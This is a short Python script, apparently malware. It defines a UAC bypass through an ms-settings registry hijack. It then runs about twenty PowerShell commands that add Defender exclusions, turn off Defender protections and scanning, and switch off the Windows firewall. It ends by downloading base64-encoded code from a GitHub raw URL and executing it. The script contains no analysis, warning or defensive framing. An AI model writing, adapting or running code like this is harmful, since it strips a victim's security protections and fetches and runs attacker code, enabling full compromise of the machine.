import requests
import base64
import winreg
import subprocess

DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'

def create_reg_key(key, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        pass

def bypass_uac(cmd):
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        pass

def disable1():
    try:
        subprocess.call(
            "powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=True)
    except:
        pass

def disable2():
    try:
        subprocess.call(
        "powershell.exe -command Add-MpPreference -ExclusionExtension .tmp", shell=True)
    except:
        pass

def disable3():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled", shell=True)
    except:
        pass

def disable4():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -PUAProtection disable", shell=True)
    except:
        pass

def disable5():
    try:
        subprocess.call(
        "powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=True)
    except:
        pass

def disable6():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $true", shell=True)
    except:
        pass

def disable7():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -DisableIOAVProtection $true", shell=True)
    except:
        pass

def disable8():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -DisablePrivacyMode $true", shell=True)
    except:
        pass

def disable9():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true", shell=True)
    except:
        pass

def disable10():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -DisableArchiveScanning $true", shell=True)
    except:
        pass

def disable11():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $true", shell=True)
    except:
        pass

def disable12():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -DisableScriptScanning $true", shell=True)
    except:
        pass

def disable13():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2", shell=True)
    except:
        pass

def disable14():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=True)
    except:
        pass

def disable15():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force", shell=True)
    except:
        pass

def disable16():
    """
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -MJm58c3rHqfYBhsLdqd1s7hew76sNfiS1y 6", shell=True)
    except:
        pass
    """
    pass

def disable17():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6", shell=True)
    except:
        pass

def disable18():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6", shell=True)
    except:
        pass

def disable19():
    try:
        subprocess.call(
        "powershell.exe -command Set-MpPreference -ScanScheduleDay 8", shell=True)
    except:
        pass

def disable20():
    try:
        subprocess.call(
        "powershell.exe -command netsh advfirewall set allprofiles state off", shell=True)
    except:
        pass


disable1()
disable2()
disable3()
disable4()
disable5()
disable6()
disable7()
disable8()
disable9()
disable10()
disable11()
disable12()
disable13()
disable14()
disable15()
disable16()
disable17()
disable18()
disable19()
disable20()



a = requests.get("https://raw.githubusercontent.com/Anex00/mystartingrepo/main/cli").text
exec(base64.b64decode(a))
